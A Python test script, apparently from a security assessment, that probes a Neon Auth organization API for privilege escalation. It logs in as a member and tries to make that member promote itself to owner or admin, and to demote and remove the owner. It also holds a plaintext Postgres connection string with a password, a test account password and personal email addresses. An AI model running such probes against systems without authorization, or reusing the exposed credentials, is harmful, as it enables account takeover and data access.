# -*- coding: utf-8 -*-
"""org 角色操作精确测试:
1. PG 查 member 行 id(neon_auth.member)
2. owner 基线:update-member-role admin / remove-member / leave 参数格式
3. ★ member 自提权:memberId=自己行 id, role=owner/admin —— 若 200 = 越权洞"""
import http.client, ssl, json, time, psycopg

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
ORIGIN = 'http://localhost:3000'
ORG_ID = '5cab4435-9577-44cb-8cf0-50fa9a84ebd7'
PW = 'SecTest!2026pass2'

def login(email):
    conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
         'Content-Type': 'application/json', 'Origin': ORIGIN}
    conn.request('POST', '/neondb/auth/sign-in/email',
                 json.dumps({'email': email, 'password': PW}).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    conn.close()
    ck = ''
    for part in hdrs.get('set-cookie', '').split(','):
        kv = part.strip().split(';')[0]
        if '=' in kv:
            k, v = kv.split('=', 1)
            ck = ck + ('; ' if ck else '') + '%s=%s' % (k.strip(), v.strip())
    return st, ck

def req(cookie, method, path, body=None):
    try:
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Content-Type': 'application/json', 'Origin': ORIGIN, 'Cookie': cookie}
        conn.request(method, '/neondb/auth' + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        conn.close()
        return st, raw.decode('utf-8', 'replace')
    except Exception as e:
        return -1, 'EXC %s' % e

print('=== [1] PG 查 member 行 ===', flush=True)
URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
try:
    conn = psycopg.connect(URI, connect_timeout=20)
    conn.autocommit = True
    cur = conn.cursor()
    cur.execute("""SELECT id, "organizationId", "userId", role FROM neon_auth.member
                   WHERE "organizationId" = %s ORDER BY "createdAt" """, (ORG_ID,))
    rows = cur.fetchall()
    for r in rows:
        print('  member: id=%s org=%s user=%s role=%s' % r, flush=True)
    conn.close()
    M_NA2 = M_N12 = None
    # 找 na2/na12 的 user id(从 neon_auth.user email)
    cur2 = None
    conn2 = psycopg.connect(URI, connect_timeout=20)
    conn2.autocommit = True
    cur2 = conn2.cursor()
    cur2.execute("SELECT id, email FROM neon_auth.user WHERE email LIKE 'libobo1229%%'")
    umap = {r2[1]: r2[0] for r2 in cur2.fetchall()}
    for r in rows:
        if umap.get('libobo1229+na2@gmail.com') == r[2]:
            M_NA2 = r[0]
        if umap.get('libobo1229+secn12@gmail.com') == r[2]:
            M_N12 = r[0]
    conn2.close()
    print('user map:', umap, flush=True)
except Exception as e:
    print('PG err:', e, flush=True)
    M_NA2 = M_N12 = None

if not M_N12:
    print('NO member rows found; abort'); raise SystemExit

st, ck2 = login('libobo1229+na2@gmail.com')
st, ck12 = login('libobo1229+secn12@gmail.com')
print('owner:', bool(ck2), 'member:', bool(ck12), flush=True)
print('member row id (secn12):', M_N12, 'owner row id (na2):', M_NA2, flush=True)

print('\n=== [2] ★ member 自提权尝试 ===', flush=True)
# member 把自己 role 改为 owner
st, raw = req(ck12, 'POST', '/organization/update-member-role',
              {'memberId': M_N12, 'role': 'owner', 'organizationId': ORG_ID})
print('[member->owner self] -> %d %s' % (st, raw[:200].replace('\n', ' ')), flush=True)
st, raw = req(ck12, 'POST', '/organization/update-member-role',
              {'memberId': M_N12, 'role': 'admin', 'organizationId': ORG_ID})
print('[member->admin self] -> %d %s' % (st, raw[:200].replace('\n', ' ')), flush=True)

print('\n=== [3] member 移除 owner / 改 owner 角色 ===', flush=True)
if M_NA2:
    st, raw = req(ck12, 'POST', '/organization/update-member-role',
                  {'memberId': M_NA2, 'role': 'member', 'organizationId': ORG_ID})
    print('[member demote owner] -> %d %s' % (st, raw[:200].replace('\n', ' ')), flush=True)
    st, raw = req(ck12, 'POST', '/organization/remove-member',
                  {'memberIdOrEmail': M_NA2, 'organizationId': ORG_ID})
    print('[member remove owner] -> %d %s' % (st, raw[:200].replace('\n', ' ')), flush=True)

print('\n=== [4] owner 基线对照 ===', flush=True)
st, raw = req(ck2, 'POST', '/organization/update-member-role',
              {'memberId': M_N12, 'role': 'member', 'organizationId': ORG_ID})
print('[owner set secn12 member] -> %d %s' % (st, raw[:200].replace('\n', ' ')), flush=True)
st, raw = req(ck2, 'POST', '/organization/remove-member',
              {'memberIdOrEmail': M_N12, 'organizationId': ORG_ID})
print('[owner remove secn12(memberId)] -> %d %s' % (st, raw[:200].replace('\n', ' ')), flush=True)
st, raw = req(ck2, 'POST', '/organization/remove-member',
              {'memberIdOrEmail': 'libobo1229+secn12@gmail.com', 'organizationId': ORG_ID})
print('[owner remove secn12(email)] -> %d %s' % (st, raw[:200].replace('\n', ' ')), flush=True)

print('\n=== [5] 终态:成员清单 ===', flush=True)
st, raw = req(ck2, 'GET', '/organization/list')
print('na2 orgs:', st, raw[:300].replace('\n', ' '), flush=True)
